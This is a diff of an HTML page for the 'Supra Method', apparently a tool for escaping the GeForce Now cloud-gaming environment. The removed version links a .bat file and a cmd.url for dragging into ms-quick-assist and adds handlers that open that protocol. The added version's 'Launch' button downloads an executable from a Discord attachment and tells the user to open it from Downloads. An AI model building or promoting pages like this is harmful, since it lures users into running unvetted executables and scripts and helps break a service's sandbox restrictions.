@@ -3,209 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Supra Method</title>
-    <link rel="icon" type="image/gif" href="../../images/7tpSLy5">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"> <!-- Add Font Awesome stylesheet -->
+    <title>Your Smooth Page</title>
     <style>
-        body, h1, h2, p, ul, li, button {
+        body {
             margin: 0;
             padding: 0;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            background: url('https://wallpapercave.com/wp/wp2763910.gif') no-repeat center center fixed;
-            background-size: cover;
-            color: #fff;
-            height: 100vh;
-            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(45deg, #f2f2f2, #333);
+            background-size: 400% 400%;
+            animation: gradientAnimation 10s infinite; /* Adjust the duration as needed */
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            transition: color 0.5s ease; /* Smooth color transition */
+            justify-content: center;
+            height: 100vh;
+            position: relative;
         }
 
         h1 {
-            margin-bottom: 10px;
-            font-size: 28px;
-            color: #fff; /* Change title text color to white */
-            transition: color 1s ease; /* Smooth color transition, change every second */
-        }
-
-        header {
-            backdrop-filter: blur(6px);
-            text-align: center;
-            padding: 20px;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            z-index: 1;
-        }
-
-        nav {
-            margin-top: 10px;
-        }
-
-        nav a {
-            text-decoration: none;
-            color: #fff;
-            margin-right: 20px;
-            font-size: 16px;
-            transition: transform 0.3s ease; /* Smooth link animation */
-            cursor: grab; /* Add grab cursor for draggable links */
-        }
-
-        nav a:hover {
-            transform: translateY(-3px); /* Move link up on hover */
-        }
-
-        main {
-            max-width: 800px;
-            width: 100%;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.5); /* Add a subtle background color */
-            border-radius: 15px; /* Increase border-radius for rounded corners */
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            z-index: 0;
-            position: relative;
-            transition: background-color 0.5s ease; /* Smooth background transition */
-            backdrop-filter: blur(6px); /* Apply backdrop filter for blur effect */
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 1s forwards; /* Fade-in animation */
-        }
-
-        section {
+            font-size: 3em;
             margin-bottom: 20px;
+            background: linear-gradient(90deg, rgb(255, 0, 0), rgb(0, 255, 0), rgb(0, 0, 0));
+            background-size: 600% 100%;
+            color: transparent;
+            -webkit-background-clip: text;
+            text-shadow: 0 0 10px white; /* White outline */
+            animation: gradientTextAnimation 5s infinite; /* Adjust the duration as needed */
         }
 
-        h2 {
-            color: #fff; /* Change heading color to white */
-            font-size: 24px;
-            margin-bottom: 10px;
+        @keyframes gradientAnimation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        @keyframes gradientTextAnimation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Trail Effect Styles */
+        .cursor-trail {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background-color: #ffcc00; /* Trail color */
+            border-radius: 50%;
+            pointer-events: none;
+            transform-origin: center;
             opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 1s forwards; /* Fade-in animation */
+            transition: opacity 0.5s ease;
         }
 
-        h2 a {
-            text-decoration: underline; /* Always underline the link */
-            transition: color 0.3s ease; /* Smooth color transition */
-            cursor: grab; /* Add grab cursor for draggable links */
-        }
-
-        h2 a:hover {
-            color: #ffd700; /* Change link color on hover */
-        }
-
-        ul {
-            list-style-type: none;
-            padding: 0;
-        }
-
-        li {
-            margin-bottom: 10px;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 1s forwards; /* Fade-in animation */
+        a.button-link {
+            position: relative;
+            text-decoration: none;
         }
 
         button {
-            background-color: #007acc;
-            color: #fff;
-            padding: 10px 20px;
+            font-size: 2em;
+            padding: 15px 30px;
+            background-color: #002147; /* Dark blue color */
+            color: white;
             border: none;
-            border-radius: 15px; /* Increase border-radius for rounded corners */
+            border-radius: 10px;
             cursor: pointer;
-            margin-right: 10px;
-            font-size: 16px;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
         button:hover {
-            background-color: #005b9c;
+            background-color: #001529; /* Darker blue color on hover */
+            transform: scale(1.1);
         }
 
-        a {
-            text-decoration: none;
-            color: #fff; /* Change link color to white */
-            font-weight: bold;
-            transition: color 0.3s ease; /* Smooth color transition */
-        }
-
-        a:hover {
-            text-decoration: underline;
-        }
-
-        .discord-icon {
-            font-size: 24px;
-            color: #7289da; /* Discord color */
-            margin-top: 10px;
-            cursor: pointer;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 1s forwards; /* Fade-in animation */
-        }
-
-        .video-window {
+        .notification {
+            display: none;
             position: fixed;
-            top: 0;
-            right: 0;
-            width: 300px;
-            height: 200px;
-            background-color: #ffffff;
-            border: 1px solid #000000;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(76, 175, 80, 0.8); /* Background with blur effect */
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            z-index: 999; /* Ensure notification is on top */
+            backdrop-filter: blur(5px); /* Blur effect */
         }
 
-        @keyframes fadeInUp {
-            to {
-                opacity: 1;
+        .check-icon {
+            width: 40px;
+            height: 40px;
+            background: url('https://cdn-icons-png.freepik.com/512/5610/5610944.png') no-repeat center center;
+            background-size: cover;
+            margin: 0 auto 10px; /* Center the icon */
+        }
+
+        .animated-text {
+            position: absolute;
+            bottom: 10px;
+            font-size: 1.2em;
+            color: white;
+            opacity: 0;
+            animation: jumpAnimation 1s infinite;
+        }
+
+        @keyframes jumpAnimation {
+            0%, 20%, 50%, 80%, 100% {
                 transform: translateY(0);
             }
+            40%, 60% {
+                transform: translateY(-15px);
+            }
+        }
+
+        .arrow-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            background-color: #ffcc00;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            transform: rotate(45deg);
+            display: none;
+        }
+
+        .show-arrow .arrow-indicator {
+            display: block;
         }
     </style>
 </head>
 <body>
+    <h1>Supra Bootstrapper</h1>
+    <a href="https://cdn.discordapp.com/attachments/1199408845513039992/1201602008638038067/SupraV3_5.exe?ex=65ca6a13&is=65b7f513&hm=122d66c0cf6131dad8e2d23716257a437b48f25c80bd6554d471b12b4890a1ba&" class="button-link">
+        <button onclick="showNotification()">Launch</button>
+    </a>
+    <div class="animated-text">Crash Fixed</div>
+    <div class="cursor-trail"></div> <!-- Cursor trail element -->
+    <div class="arrow-indicator"></div> <!-- Arrow indicator element -->
 
-<script>
-    document.addEventListener('keydown', function(event) {
-        if (event.key === 'q') {
-            window.location.href = 'ms-quick-assist:';
+    <div id="notification" class="notification">
+        <div class="check-icon"></div>
+        Open file in Downloads! SupraMethod
+    </div>
+
+    <script>
+        function showNotification() {
+            var notification = document.getElementById("notification");
+            notification.style.display = "block";
+
+            // Show the arrow indicator
+            var arrowIndicator = document.querySelector(".arrow-indicator");
+            arrowIndicator.classList.add("show-arrow");
+
+            // Hide the notification after 2 seconds (adjust as needed)
+            setTimeout(function() {
+                notification.style.display = "none";
+                // Hide the arrow indicator
+                arrowIndicator.classList.remove("show-arrow");
+            }, 2000);
         }
-    });
-</script>
 
-<header>
-    <h1>Supra Method</h1>
-    <nav>
-        <!-- Add navigation links if needed -->
-    </nav>
-</header>
-<main>
-    <section>
-        <h2>Geforce Now Method By Supra Method : (GAME WARTHUNDER) [WARGAMING LAUNCHER]</h2>
-    </section>
-    <section>
-        <h2><a href="https://cdn.discordapp.com/attachments/1199408845513039992/1199752741065605201/SupraMethod___.bat?ex=65c3afcf&is=65b13acf&hm=d07a889938ff2a4e977bfba72a69b0eb6f2f5c5725070f95cab28c4574309acc&" target="_blank" draggable="true">Drag To ms-quick-assist Launcher</a></h2>
-		        <h2><a href="https://files.printedwaste.com/files/public/shardcats/cmd.url" target="_blank" draggable="true">Drag To ms-quick-assist CMD</a></h2>
+        document.addEventListener("mousemove", function(e) {
+            // Update the position of the cursor trail
+            var cursorTrail = document.querySelector(".cursor-trail");
+            cursorTrail.style.left = e.pageX + "px";
+            cursorTrail.style.top = e.pageY + "px";
 
-        <!-- Add the button for opening ms quick assist -->
-        <button onclick="window.open('ms-quick-assist:', '_blank')">Open ms quick assist</button>
-    </section>
-    <section>
-        <h2>Latest Patches :</h2>
-        <ul>
-            <h1> - Fixed Crash UADML</h1>
-            <h1> - More Patch note on Discord</h1>
-        </ul>
-    </section>
-
-    <!-- Discord icon, update the link to your Discord server -->
-    <i class="fab fa-discord discord-icon" onclick="window.location.href='https://discord.gg/ARMPqxUnY7'"></i>
-</main>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script> <!-- Add Font Awesome script -->
+            // Show the cursor trail with a fade-in effect
+            cursorTrail.style.opacity = "0.8";
+            setTimeout(function() {
+                cursorTrail.style.opacity = "0";
+            }, 500);
+        });
+    </script>
 </body>
 </html>
